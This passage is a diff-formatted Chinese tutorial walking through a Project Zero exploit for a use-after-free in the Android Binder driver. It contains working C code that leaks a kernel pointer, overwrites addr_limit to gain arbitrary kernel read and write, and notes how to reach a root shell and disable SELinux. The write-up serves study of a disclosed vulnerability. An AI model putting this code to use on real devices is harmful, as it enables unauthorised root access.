@@ -1,0 +1,135 @@
+        exitWithError("[PARENT] Leak failed: writev returned %d, expected 0x2000.", byteSent);
+    if(read(pipefd[0], leakBuff, sizeof(leakBuff)) != sizeof(leakBuff))
+        exitWithError("[PARENT] Read failed: %s", strerror(errno));
+    __android_log_print(ANDROID_LOG_INFO, "EXPLOIT", "leak + 0xE8 = %lx\n", *(uint64_t *)(leakBuff + 0xE8));
+    thread_info = *(unsigned long *)(leakBuff + 0xE8);
+运行此应用程序时，我们将在logcat中获得类似于下面的信息：
+    com.example.binderuaf I/EXPLOIT: leak + 0xE8 = fffffffec88c5700
+该指针指向当前的进程`thread_info`结构体。这个结构体有一个非常有用的成员，我们可以利用它来获取任意的读写原语。
+## 建立任意读写原语
+### 突破限制
+因此，我们泄漏了一个有用的内核指针，现在呢？让我们看看`task_info`的前几个成员。
+    struct thread_info {
+        unsigned long       flags;      /* low level flags */
+        mm_segment_t        addr_limit; /* address limit */
+        struct task_struct  *task;      /* main task structure */
+        int         preempt_count;      /* 0 => preemptable,  bug */
+        int         cpu;               /* cpu */
+    };
+这里比较有趣的一个成员是`addr_limit`。有一些非常重要的与安全有关的宏引用了该字段。让我们看看其中之一——`access_ok`。
+    #define access_ok(type, addr, size) __range_ok(addr, size)
+从`__range_ok`的注释可得知它基本上等同于`(u65)addr + (u65)size addr_limit`。在内核尝试访问用户提供的指针的任何地方，几乎都会使用此宏。它用于确保所提供的指针确实是一个用户态指针并防止人们在内核期望用户态指针的地方传递内核态指针。一旦`addr_limit`的限制被突破就可以自由地向期望用户态指针的地方传递内核态指针，且`access_ok`将永远不会失败。
+### 获得可控制的写入原语
+我们已经演示了可以使用unlink读取和泄漏内核数据——但是如何修改呢？为了泄漏内核数据，我们将iovec结构体写入文件描述符中，并使用unlink覆写其中的一个结构体，以便read函数能泄漏数据。要覆写内核数据，我们可以采用另一种方法。通过使用iovec结构体调用recvmsg函数并以相同的方式对其进行覆写，我们可以使用write函数将写入的数据覆写到相继的iovec结构体上以获得任意写入。  
+让我们看一下使用recvmsg函数覆盖UAF对象的iovec结构体。
+    iovec_array[IOVEC_INDX_FOR_WQ].iov_base = dummy_page; // mutex
+    iovec_array[IOVEC_INDX_FOR_WQ].iov_len = 1; // linked list next
+    iovec_array[IOVEC_INDX_FOR_WQ + 1].iov_base = (void *)0xDEADBEEF; // linked list prev
+    iovec_array[IOVEC_INDX_FOR_WQ + 1].iov_len = 0x8 + 2 * 0x10; // iov_len of previous, then this element and next element
+    iovec_array[IOVEC_INDX_FOR_WQ + 2].iov_base = (void *)0xBEEFDEAD;
+    iovec_array[IOVEC_INDX_FOR_WQ + 2].iov_len = 8;
+就像infoleak中的情况，unlink使用内核指针覆盖了`IOVEC_INDX_FOR_WQ`处的iovec的`iov_len`和`IOVEC_INDX_FOR_WQ+1`处的iovec的`iov_base`。这个内核指针不仅仅指向一些随机数据——如果我们再看一看KGDB的输出，我们会发现它指向`IOVEC_INDX_FOR_WQ`的iovec的`iov_len`(和前面一样)！  
+一旦recvmsg函数达到此iovec，它将开始将我们通过write函数写入的数据复制到该指针中——这使我们可以将任意数据写入后面经过验证的iovec结构体中，也就是说可以将任何指针传递给下一个iovec的`iov_base`——从而实现了任意写。查看写入的数据，可以看到它确实与`IOVEC_INDX_FOR_WQ`处的`iov_len`以后的数据对齐。
+    unsigned long second_write_chunk[] = {
+        1, /* iov_len */
+        0xdeadbeef, /* iov_base (already used) */
+        0x8 + 2 * 0x10, /* iov_len (already used) */
+        current_ptr + 0x8, /* next iov_base (addr_limit) */
+        8, /* next iov_len (sizeof(addr_limit)) */
+        0xfffffffffffffffe /* value to write */
+    };
+注：这里其实原来文章也没有说清楚，和之前一样，触发UAF/unlink破坏iovec结构之后iovec[10].iov_len和iovec[11].iov_base的值都是iovec[10].iov_len的地址，iovec[11].iov_len被设置成0x28，也就是说iovec[10].iov_len，iovec[11].iov_base，iovec[11].iov_len，iovec[12].iov_base和iovec[12].iovec_len会被覆写成`second_write_chunk`中的内容，iovec[12].iov_base被覆写成`addr_limit`，iovec[12].iov_len被覆写成`sizeof(addr_limit)`，然后`addr_limit`再被覆写成0xfffffffffffffffe。  
+现在就得到了修改父进程的`addr_limit`的代码。同样，从功能上讲，代码与Project Zero的代码相似，但是已清理并使用JNI函数。
+    #define OFFSET_OF_ADDR_LIMIT 8
+    struct epoll_event event = {.events = EPOLLIN};
+    struct iovec iovec_array[IOVEC_ARRAY_SZ];
+    int iovec_corruption_payload_sz;
+    int sockfd[2];
+    int byteSent;
+    pid_t pid;
+    memset(iovec_array, 0, sizeof(iovec_array));
+    if(epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &event))
+        exitWithError("EPOLL_CTL_ADD failed: %s", strerror(errno));
+    unsigned long iovec_corruption_payload[] = {
+            1,                  // IOVEC_INDX_FOR_WQ -> iov_len
+            0xdeadbeef,         // IOVEC_INDX_FOR_WQ + 1 -> iov_base
+            0x8 + (2 * 0x10),   // IOVEC_INDX_FOR_WQ + 1 -> iov_len
+            thread_info + OFFSET_OF_ADDR_LIMIT, // Arb. Write location! IOVEC_INDEX_FOR_WQ + 2 -> iov_base
+            8,                  // Arb. Write size (only need a QWORD)! IOVEC_INDEX_FOR_WQ + 2 -> iov_len
+            0xfffffffffffffffe, // Arb. Write value! Smash it so we can write anywhere.
+    };
+    iovec_corruption_payload_sz = sizeof(iovec_corruption_payload);
+    iovec_array[IOVEC_INDX_FOR_WQ].iov_base = dummy_page; // mutex
+    iovec_array[IOVEC_INDX_FOR_WQ].iov_len  = 1; // only ask for one byte since we'll only write one byte - linked list next
+    iovec_array[IOVEC_INDX_FOR_WQ + 1].iov_base = (void *)0xDEADBEEF; // linked list prev
+    iovec_array[IOVEC_INDX_FOR_WQ + 1].iov_len  = 0x8 + 2 * 0x10;     // length of previous iovec + this one + the next one
+    iovec_array[IOVEC_INDX_FOR_WQ + 2].iov_base = (void *)0xBEEFDEAD; // will get smashed by iovec_corruption_payload
+    iovec_array[IOVEC_INDX_FOR_WQ + 2].iov_len  = 8;
+    if(socketpair(AF_UNIX, SOCK_STREAM, 0, sockfd))
+        exitWithError("Socket pair failed: %s", strerror(errno));
+    // Preemptively satisfy the first iovec request
+    if(write(sockfd[1], "X", 1) != 1)
+        exitWithError("Write 1 byte failed: %s", strerror(errno));
+    pid = fork();
+    if(pid == 0)
+    {
+        prctl(PR_SET_PDEATHSIG, SIGKILL);
+        sleep(2);
+        epoll_ctl(epfd, EPOLL_CTL_DEL, fd, &event);
+        byteSent = write(sockfd[1], iovec_corruption_payload, iovec_corruption_payload_sz);
+        if(byteSent != iovec_corruption_payload_sz)
+            exitWithError("[CHILD] Write returned %d, expected %d.", byteSent, iovec_corruption_payload_sz);
+        _exit(0);
+    }
+    ioctl(fd, BINDER_THREAD_EXIT, NULL);
+    struct msghdr msg = {
+            .msg_iov = iovec_array,
+            .msg_iovlen = IOVEC_ARRAY_SZ
+    };
+    recvmsg(sockfd[0], &msg, MSG_WAITALL);
+### 任意读写辅助函数
+现在，这一进程地址限制已经被绕过，任意内核读写很简单，只要几个read和write系统调用。通过write将想要写入的数据写到管道，并在管道的另一端read一个内核地址，就可以将数据写入该内核地址。相反，通过write将数据从一个内核地址写入管道，然后在管道的另一端调用read，就可以从该内核地址读取数据。成功实现任意读写！
+    int kernel_rw_pipe[2];
+    //...
+    if(pipe(kernel_rw_pipe))
+        exitWithError("Kernel R/W Pipe failed: %s", strerror(errno));
+    //...
+    void kernel_write(unsigned long kaddr, void *data, size_t len)
+    {
+        if(len > 0x1000)
+            exitWithError("Reads/writes over the size of a page results causes issues.");
+        if(write(kernel_rw_pipe[1], data, len) != len)
+            exitWithError("Failed to write data to kernel (write)!");
+        if(read(kernel_rw_pipe[0], (void *)kaddr, len) != len)
+            exitWithError("Failed to write data to kernel (read)!");
+    }
+    void kernel_read(unsigned long kaddr, void *data, size_t len)
+    {
+        if(len > 0x1000)
+            exitWithError("Reads/writes over the size of a page results causes issues.");
+        if(write(kernel_rw_pipe[1], (void *)kaddr, len) != len)
+            exitWithError("Failed to read data from kernel (write)!");
+        if(read(kernel_rw_pipe[0], data, len) != len)
+            exitWithError("Failed to read data from kernel (read)!");
+    }
+### 注意事项
+某些设备(即使它们存在漏洞)可能会在writev调用中失败，因为它将返回0x1000而不是所需的0x2000。这通常是因为waitqueue的偏移量不正确，在这种情况下必须针对目标机器提取内核映像，并提取适当的偏移量(或对其进行暴力破解)。
+## 结论
+一旦完成了内核的读写操作，基本上就结束了。修改cred之后就可以获得root
+shell。如果不是用的三星设备，则可以禁用SELinux并修补`init_task`以便在利用漏洞后启动的每个新进程均以完全特权自动启动。在三星设备上由于存在Knox我认为如果不做额外的工作不可能做到这一点。但是在大多数其他设备上这些应该不是问题。  
+值得注意的是，Project
+Zero的EXP非常稳定。它很少会失败，而当它失败时通常只是返回错误而不是内核崩溃，因此只需要再次运行就可以了。对于像我这样设备具有OEM的人来说，这使其成为一种了不起的临时root方法。  
+总体而言，我认为Jann Horn和Maddie
+Stone的这种利用策略非常新颖，我从中学到了很多东西。它为我提供了一种关于UAF的全新观点：如果无法从UAF对象本身获得有用的原语，可能也存在其它的方法。
+## 参考资料/其它资源
+[Issue 1942: Android; Use-After-Free in Binder driver (Chromium Bug
+Tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1942
+"Issue 1942: Android; Use-After-Free in Binder driver \(Chromium Bug
+Tracker\)")  
+[Project Zero Exploit](https://bugs.chromium.org/p/project-zero/issues/attachmentText?aid=414885 "Project Zero Exploit")  
+[Syzkaller kASAN report](https://groups.google.com/forum/#!msg/syzkaller-bugs/QyXdgUhAF50/g-FXVo1OAwAJ "Syzkaller kASAN report")  
+[Bootlin Linux kernel source
+browser](https://elixir.bootlin.com/linux/v4.4.177/source "Bootlin Linux
+kernel source browser")
+## 感谢
+Jann Horn和Maddie Stone提供了本文引用的EXP代码。
